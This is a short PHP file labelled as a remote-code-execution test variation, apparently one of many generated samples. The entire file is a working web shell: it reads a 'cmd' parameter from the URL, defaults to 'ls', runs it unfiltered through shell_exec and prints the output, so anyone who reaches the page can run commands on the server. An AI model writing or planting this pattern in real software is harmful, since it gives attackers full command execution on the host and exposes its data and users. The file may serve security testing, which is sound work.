<?php
// RCE test variation #1010
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>